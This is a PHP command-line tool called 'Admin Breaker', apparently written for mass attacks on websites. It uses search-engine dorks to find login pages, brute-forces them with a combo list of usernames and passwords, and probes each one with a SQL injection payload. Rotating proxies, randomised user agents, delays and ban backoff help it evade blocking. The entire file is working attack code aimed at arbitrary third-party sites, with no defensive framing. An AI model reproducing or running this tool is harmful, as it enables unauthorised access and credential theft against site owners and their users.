#!/usr/bin/env php

<?php
/**
 * Admin Breaker v4.1 Ultimate MixHunter (Refactored)
 * By Nyx6st(2025)
 * PHP7+ CLI
 */

// ---------------------
// CONFIGURATIONS
// ---------------------
const DATA_FOLDER   = __DIR__ . '/data/';
const OUTPUT_FOLDER = __DIR__ . '/output/';

// ANSI Colors
const C_RESET  = "\033[0m";
const C_RED    = "\033[31m";
const C_GREEN  = "\033[32m";
const C_YELLOW = "\033[33m";
const C_BLUE   = "\033[34m";

// Delay & ban threshold
const MIN_DELAY     = 5;
const MAX_DELAY     = 12;
const BAN_THRESHOLD = 3;

// Search engines patterns
$ENGINES = [
    'google' => 'https://www.google.com/search?q=%s&num=20',
    'bing'   => 'https://www.bing.com/search?q=%s&count=20',
    'duck'   => 'https://duckduckgo.com/html/?q=%s'
];

// User agents for requests
$USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F)'
];

// Domains to skip
$BAN_LIST = [
    'github.com','exploit-db.com','support.microsoft.com',
    'baidu.com','answers.microsoft.com','jingyan.baidu.com',
    'devforum.roblox.com','stackoverflow.com'
];

// ---------------------
// MAIN EXECUTION
// ---------------------
function main(array $argv) {
    global $ENGINES;

    $debug = in_array('--debug', $argv, true);
    banner();
    initFolders();

    // Prompt settings
    $choice       = prompt("[?] Pilih Dorklist: (1) Mini (2) Full: ");
    $filterInput  = prompt("[?] Filter domain (misal .in,.gov; kosong=all): ");
    $domainFilter = array_filter(array_map('trim', explode(',', $filterInput)));

    // Load lists
    $dorkFile   = DATA_FOLDER . (($choice === '1') ? 'dorklist_mini.txt' : 'dorklist.txt');
    $comboFile  = DATA_FOLDER . 'combo.txt';
    $proxyFile  = DATA_FOLDER . 'proxies.txt';

    $dorks   = loadList($dorkFile);
    $combos  = loadList($comboFile);
    $proxies = file_exists($proxyFile) ? loadList($proxyFile) : [];

    // Clear old outputs
    clearOutputs([
        'targets.txt','success.txt','fail.txt','ban.txt','captcha.txt','sqli.txt'
    ]);

    // Run phases
    $targets = runPhase1($dorks, $ENGINES, $proxies, $domainFilter, $debug);
    runPhase2($targets, $combos, $proxies, $debug);
    runPhase3($targets, $debug);

    echo C_BLUE . "[+] All phases complete\n" . C_RESET;
}

main($argv);

// ---------------------
// FUNCTIONS
// ---------------------
function banner() {
    echo str_repeat('=', 50) . "\n";
    echo C_BLUE . "  Admin Breaker" . C_RESET . "\n";
    echo C_BLUE . "  By Nyx6st (2025)" . C_RESET . "\n";
    echo str_repeat('=', 50) . "\n\n";
}

function initFolders() {
    if (!is_dir(DATA_FOLDER)) {
        fwrite(STDERR, C_RED . "[-] Data folder missing: " . DATA_FOLDER . "\n" . C_RESET);
        exit(1);
    }
    if (!is_dir(OUTPUT_FOLDER)) {
        mkdir(OUTPUT_FOLDER, 0755, true);
    }
}

function clearOutputs(array $files): void {
    foreach ($files as $file) {
        $path = OUTPUT_FOLDER . $file;
        if (file_put_contents($path, '') === false) {
            fwrite(STDERR, C_RED . "[-] Failed to clear {$path}\n" . C_RESET);
        }
    }
}

function prompt(string $msg): string {
    echo C_YELLOW . $msg . C_RESET;
    return trim(fgets(STDIN));
}

function loadList(string $file): array {
    if (!is_readable($file)) {
        fwrite(STDERR, C_RED . "[-] Cannot read file: {$file}\n" . C_RESET);
        exit(1);
    }
    return array_filter(array_map('trim', file($file)));
}

function writeLog(string $filename, string $line): void {
    file_put_contents(OUTPUT_FOLDER . $filename, $line . PHP_EOL, FILE_APPEND);
}

function httpRequest(string $url, ?array $post = null, ?string $proxy = null): array {
    global $USER_AGENTS;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, $USER_AGENTS[array_rand($USER_AGENTS)]);
    if ($post !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
    }
    if ($proxy !== null) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
    }
    $body = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);
    return ['body' => $body, 'http_code' => $info['http_code']];
}

function isBannedHost(string $url): bool {
    global $BAN_LIST;
    $host = parse_url($url, PHP_URL_HOST) ?: '';
    foreach ($BAN_LIST as $b) {
        if (stripos($host, $b) !== false) return true;
    }
    return false;
}

function runPhase1(array $dorks, array $engines, array $proxies, array $domainFilter, bool $debug): array {
    $targets = [];
    $totalJobs = count($dorks) * count($engines);
    $count = 0;
    echo C_BLUE . "[+] Phase1: Dork & Filter (Jobs: {$totalJobs})\n" . C_RESET;

    foreach ($dorks as $dork) {
        foreach ($engines as $pattern) {
            $count++;
            showProgressBar($count, $totalJobs);
            $url = sprintf($pattern, urlencode($dork));
            if (isBannedHost($url)) continue;
            // pilih proxy jika ada
            $proxy = !empty($proxies) ? $proxies[array_rand($proxies)] : null;
            $resp = httpRequest($url, null, $proxy);
            if (!$resp['body']) continue;
            if (stripos($resp['body'], 'captcha') !== false) {
                writeLog('captcha.txt', $url);
                pause(); continue;
            }
            if (preg_match_all('/href="(https?:\/\/[^"\?]+)"/i', $resp['body'], $m)) {
                foreach ($m[1] as $link) {
                    if (isBannedHost($link)) continue;
                    if ($domainFilter && !collectMatch($link, $domainFilter)) continue;
                    if (in_array($link, $targets, true)) continue;
                    $proxy = !empty($proxies) ? $proxies[array_rand($proxies)] : null;
                    $page = httpRequest($link, null, $proxy);
                    if ($page['body'] && preg_match('/(<input[^>]+type=["\']?password|login|username)/i', $page['body'])) {
                        $targets[] = $link;
                        writeLog('targets.txt', $link);
                        echo C_GREEN . "  [+] Target found: {$link}\n" . C_RESET;
                    }
                    pause();
                }
            }
            pause();
        }
    }
    echo C_BLUE . "[+] Phase1 done: " . count($targets) . " targets\n\n" . C_RESET;
    return $targets;
}

function runPhase2(array $targets, array $combos, array $proxies, bool $debug): void {
    $total = count($targets) * count($combos);
    $count = 0;
    echo C_BLUE . "[+] Phase2: Brute Force (Total attempts: {$total})\n" . C_RESET;

    foreach ($targets as $tgt) {
        echo C_YELLOW . "[*] Target: {$tgt}\n" . C_RESET;
        foreach ($combos as $c) {
            $count++;
            showProgressBar($count, $total);
            list($u, $p) = strpos($c, '|') !== false ? explode('|', $c, 2) : explode(':', $c, 2);
            $proxy = !empty($proxies) ? $proxies[array_rand($proxies)] : null;
            $resp = httpRequest($tgt, ['username' => trim($u), 'password' => trim($p)], $proxy);
            if ($resp['body'] && preg_match('/(dashboard|logout|admin-panel)/i', $resp['body'])) {
                echo C_GREEN . "    [+] SUCCESS: {$u}|{$p}\n" . C_RESET;
                writeLog('success.txt', "{$tgt} | {$u}|{$p}");
                break;
            } else {
                echo C_RED . "    [-] FAIL: {$u}|{$p}\n" . C_RESET;
                writeLog('fail.txt', "{$tgt} | {$u}|{$p}");
            }
            pause();
        }
    }
    echo C_BLUE . "[+] Phase2 done\n\n" . C_RESET;
}

function runPhase3(array $targets, bool $debug): void {
    $total = count($targets);
    $count = 0;
    echo C_BLUE . "[+] Phase3: SQLi Check (Targets: {$total})\n" . C_RESET;

    foreach ($targets as $link) {
        $count++;
        showProgressBar($count, $total);
        $testUrl = rtrim($link, '/') . urlencode("'+OR+1=1--");
        $resp = httpRequest($testUrl, null, null);
        handleBan($link, $resp['http_code']);
        pause();
        if ($resp['body'] && preg_match('/(SQL syntax|mysql_fetch_array|ORA-00933|Unknown column|SQLSTATE)/i', $resp['body'])) {
            echo C_RED . "    [+] POSSIBLE SQLi: {$link}\n" . C_RESET;
            writeLog('sqli.txt', $link);
        } else {
            echo C_GREEN . "    [-] No SQLi: {$link}\n" . C_RESET;
        }
    }
    echo C_BLUE . "[+] Phase3 done\n\n" . C_RESET;
}

function handleBan(string $context, int $code): void {
    static $banCount = 0;
    if (in_array($code, [403, 429], true)) {
        $banCount++;
        fwrite(STDERR, C_RED . "[!] Ban detected ({$code}) from {$context} | Count: {$banCount}\n" . C_RESET);
        writeLog('ban.txt', "{$context} | HTTP {$code}");
        if ($banCount >= BAN_THRESHOLD) {
            fwrite(STDERR, C_YELLOW . "[!] Threshold reached. Sleeping 60s...\n" . C_RESET);
            sleep(60);
            $banCount = 0;
        }
    }
}

function pause(): void {
    $sec = rand(MIN_DELAY, MAX_DELAY);
    printf("%s[~] Jeda %ds...%s\n", C_YELLOW, $sec, C_RESET);
    sleep($sec);
}

function showProgressBar(int $cur, int $tot, int $width = 30): void {
    $perc = $tot > 0 ? ($cur / $tot) : 0;
    $done = floor($perc * $width);
    $bar  = str_repeat('█', $done) . str_repeat('-', $width - $done);
    printf("[%s] %3d%% (%d/%d)\r", $bar, round($perc * 100), $cur, $tot);
    if ($cur === $tot) echo "\n";
}

function collectMatch(string $str, array $filters): bool {
    foreach ($filters as $f) {
        if (stripos($str, $f) !== false) return true;
    }
    return false;
}
?>
